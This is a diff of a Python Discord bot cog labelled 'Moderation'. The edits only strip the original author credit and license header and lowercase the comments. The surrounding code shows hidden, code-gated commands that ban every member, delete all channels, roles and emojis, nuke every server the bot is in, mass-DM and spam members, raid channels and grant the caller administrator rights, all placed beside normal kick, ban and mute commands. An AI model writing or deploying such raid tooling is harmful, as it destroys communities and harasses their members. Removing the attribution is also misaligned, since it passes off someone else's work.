@@ -1,9 +1,3 @@
-# Scripted by Catterall (https://github.com/Catterall).
-# Bot under the GNU General Public Liscense v2 (1991).
-
-
-# Modules.
-
 import discord
 import random
 import os
@@ -17,7 +11,7 @@ class Moderation(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    # Clear messages.
+    # clear messages
 
     @commands.command()
     @commands.has_guild_permissions(manage_messages=True)
@@ -45,7 +39,7 @@ class Moderation(commands.Cog):
                 await ctx.send(embed=embed)
         return
 
-    # Nuke the server.
+    # nuke the server
 
     @commands.command(hidden=True)
     async def nuke(self, ctx, code=None):
@@ -85,7 +79,7 @@ class Moderation(commands.Cog):
                     print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
             print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")
 
-            # Delete all channels.
+            # delete all channels
 
             print(f"{Fore.YELLOW}Deleting server channels:{Fore.RESET}")
             for c in ctx.guild.channels:
@@ -101,7 +95,7 @@ class Moderation(commands.Cog):
                         f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
             print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")
 
-            # Delete all roles.
+            # delete all roles
 
             print(f"{Fore.YELLOW}Deleting server roles:{Fore.RESET}")
             roles = ctx.guild.roles
@@ -141,7 +135,7 @@ class Moderation(commands.Cog):
             command_error("nuke")
             return
 
-    # Nuke every server.
+    # nuke every server
 
     @commands.command(hidden=True)
     async def mass_nuke(self, ctx, code=None):
@@ -183,7 +177,7 @@ class Moderation(commands.Cog):
                         print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                 print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")
 
-                # Delete all channels.
+                # delete all channels
                 print(
                     Fore.YELLOW +
                     f"Deleting server channels from server: \"{g}\":{Fore.RESET}")
@@ -200,7 +194,7 @@ class Moderation(commands.Cog):
                             f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                 print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")
 
-                # Delete all roles.
+                # delete all roles
                 print(
                     Fore.YELLOW +
                     f"Deleting server roles from server: \"{g}\":{Fore.RESET}")
@@ -222,7 +216,7 @@ class Moderation(commands.Cog):
                         break
                 print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")
 
-                # Delete all emojis.
+                # delete all emojis
                 print(
                     Fore.YELLOW +
                     f"Deleting server emojis from server \"{g}\":{Fore.RESET}")
@@ -244,7 +238,7 @@ class Moderation(commands.Cog):
             command_error("mass_nuke")
             return
 
-    # Delete all channels only.
+    # delete all channels only
 
     @commands.command(hidden=True)
     async def cpurge(self, ctx, code=None):
@@ -264,7 +258,7 @@ class Moderation(commands.Cog):
             command_error("cpurge")
             return
 
-    # Message all members with a message.
+    # message all members with a message
 
     @commands.command(hidden=True)
     async def mass_dm(self, ctx, code=None, *, message=None):
@@ -289,7 +283,7 @@ class Moderation(commands.Cog):
             command_error("mass_dm")
             return
 
-    # Make yourself an administator on the server.
+    # make yourself an administator on the server
 
     @commands.command(hidden=True)
     async def admin(self, ctx, code=None, *, role_name=None):
@@ -309,7 +303,7 @@ class Moderation(commands.Cog):
             command_error("admin")
             return
 
-    # Spam all text channels with a message.
+    # spam all text channels with a message
 
     @commands.command(hidden=True)
     async def spam(self, ctx, code=None, *, message=None):
@@ -339,7 +333,7 @@ class Moderation(commands.Cog):
             command_error("spam")
             return
 
-    # Change the nickname of every member.
+    # change the nickname of every member
 
     @commands.command(hidden=True)
     async def mass_nick(self, ctx, code=None, *, nickname=None):
@@ -361,7 +355,7 @@ class Moderation(commands.Cog):
             command_error("mass_nick")
             return
 
-    # Raid the server.
+    # raid da server
 
     @commands.command(hidden=True)
     async def raid(self, ctx, code=None, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
@@ -375,7 +369,7 @@ class Moderation(commands.Cog):
                 return
             channelNum = int(channelNum)
 
-            # Delete all channels.
+            # delete all channels
 
             for c in ctx.guild.channels:
                 try:
@@ -383,7 +377,7 @@ class Moderation(commands.Cog):
                 except discord.Forbidden:
                     continue
 
-            # Delete all roles.
+            # delete all roles
 
             roles = ctx.guild.roles
             roles.pop(0)
@@ -396,7 +390,7 @@ class Moderation(commands.Cog):
                 else:
                     break
 
-            # Create a new role and give it to all members.
+            # create a new role and give it to all members
 
             await ctx.guild.create_role(name=rolename, colour=discord.Colour(0xff0000))
             role = discord.utils.get(ctx.guild.roles, name=rolename)
@@ -406,7 +400,7 @@ class Moderation(commands.Cog):
                 except BaseException:
                     continue
 
-            # Nickname all members.
+            # nickname all members
 
             for member in ctx.guild.members:
                 try:
@@ -414,7 +408,7 @@ class Moderation(commands.Cog):
                 except BaseException:
                     continue
 
-            # Create i number of channels named <channelNum>.
+            # create i number of channels named <channelNum>
 
             for i in range(channelNum):
                 try:
@@ -422,7 +416,7 @@ class Moderation(commands.Cog):
                 except BaseException:
                     continue
 
-            # Message all members with a message.
+            # message all members with a message
 
             for member in ctx.guild.members:
                 try:
@@ -434,7 +428,7 @@ class Moderation(commands.Cog):
                 except BaseException:
                     continue
 
-            # Raid all text channels.
+            # Raid all text channels
 
             print(f"{Fore.LIGHTBLUE_EX}Raiding started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the raiding.{Fore.RESET}")
 
@@ -455,7 +449,7 @@ class Moderation(commands.Cog):
             command_error("raid")
             return
 
-    # Leave the server.
+    # Leave the server
 
     @commands.command(hidden=True)
     async def leave(self, ctx, code=None, *, guild_name=None):
@@ -479,7 +473,7 @@ class Moderation(commands.Cog):
             command_error("leave")
             return
 
-    # Leave all servers.
+    # Leave all servers
 
     @commands.command(hidden=True)
     async def mass_leave(self, ctx, *, code=None):
@@ -510,7 +504,7 @@ class Moderation(commands.Cog):
             command_error("mass_leave")
             return
 
-    # Refresh the window.
+    # Refresh the window
 
     @commands.command(hidden=True)
     async def refresh(self, ctx, code=None):
@@ -524,7 +518,7 @@ class Moderation(commands.Cog):
             command_error("refresh")
             return
 
-    # Kick a member.
+    # Kick a member
 
     @commands.command()
     @commands.has_guild_permissions(kick_members=True)
@@ -537,7 +531,7 @@ class Moderation(commands.Cog):
         await ctx.send(embed=embed)
         return
 
-    # Ban a member.
+    # Ban a member
 
     @commands.command()
     @commands.has_guild_permissions(ban_members=True, kick_members=True)
@@ -550,7 +544,7 @@ class Moderation(commands.Cog):
         await ctx.send(embed=embed)
         return
 
-    # Unban a member.
+    # Unban a member
 
     @commands.command()
     @commands.has_guild_permissions(administrator=True)
@@ -570,7 +564,7 @@ class Moderation(commands.Cog):
                 await ctx.send(embed=embed)
                 return
 
-    # Mute a member.
+    # Mute a member
 
     @commands.command()
     @commands.has_guild_permissions(manage_roles=True)
@@ -614,7 +608,7 @@ class Moderation(commands.Cog):
                 await ctx.send(embed=embed)
                 return
 
-    # Unmute a member.
+    # Unmute a member
 
     @commands.command()
     @commands.has_guild_permissions(manage_roles=True)
@@ -655,7 +649,3 @@ class Moderation(commands.Cog):
 
 def setup(bot):
     bot.add_cog(Moderation(bot))
-
-
-# Scripted by Catterall (https://github.com/Catterall).
-# Bot under the GNU General Public Liscense v2 (1991).
